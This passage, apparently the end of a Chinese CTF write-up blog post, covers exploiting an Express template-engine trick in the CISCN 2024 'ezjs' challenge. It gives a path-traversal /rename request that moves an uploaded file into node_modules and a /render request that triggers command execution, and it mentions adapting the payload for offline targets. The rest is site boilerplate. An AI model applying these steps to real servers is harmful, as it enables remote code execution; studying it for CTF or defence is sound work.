+<p>上传成功后，利用<code>/rename</code>路由实现目录穿越，从而把此文件移动到<code>node_modules</code>文件夹</p>
+<p>paylaod如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/rename?oldPath=index.js&amp;newPath=../node_modules/aaa/index.js</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick/image-20240729203902624.png"></p>
+<p>然后再上传一个<code>.aaa</code>后缀的文件，接着访问<code>/render</code>渲染该文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/render?filename=1.aaa</span><br></pre></td></tr></table></figure>
+
+<p>参数engine里替换成我们的payload，成功命令执行</p>
+<blockquote>
+<p>当然决赛的时候是不出网的，也就是payload要稍微改一下把执行结果写入到其他文件比如1.ejs内，然后再一次渲染1.ejs即可回显结果</p>
+</blockquote>
+<hr>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>vscode调试nodejs</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/108939892">https://zhuanlan.zhihu.com/p/108939892</a></li>
+</ul>
+<p>漏洞分析</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13512?time__1311=GqmxuDciiQ=05DKy4Cqgz=DkA8n7bD">https://xz.aliyun.com/t/13512?time__1311=GqmxuDciiQ%3D05DKy4Cqgz%3DDkA8n7bD</a></li>
+<li><a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/#ezjs">https://c1oudfl0w0.github.io/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/#ezjs</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/express/" rel="tag"># express</a>
+              <a href="/tags/nodejs/" rel="tag"># nodejs</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/%E8%AE%B0%E5%BD%95%E6%9F%90%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html" rel="prev" title="记录某靶场渗透测试">
+      <i class="fa fa-chevron-left"></i> 记录某靶场渗透测试
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/%E8%AE%B0%E5%BD%95vscode%E8%B0%83%E8%AF%95nodejs.html" rel="next" title="记录vscode调试nodejs">
+      记录vscode调试nodejs <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90Express-engine%E5%A4%84%E7%90%86%E5%BC%95%E6%93%8E%E7%9A%84trick"><span class="nav-number">1.</span> <span class="nav-text">分析Express engine处理引擎的trick</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E9%93%BE%E7%AE%80%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">流程链简析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-CISCN2024%E5%9B%BD%E5%86%B3-ezjs"><span class="nav-number">1.4.</span> <span class="nav-text">[例题]CISCN2024国决-ezjs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">1.5.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
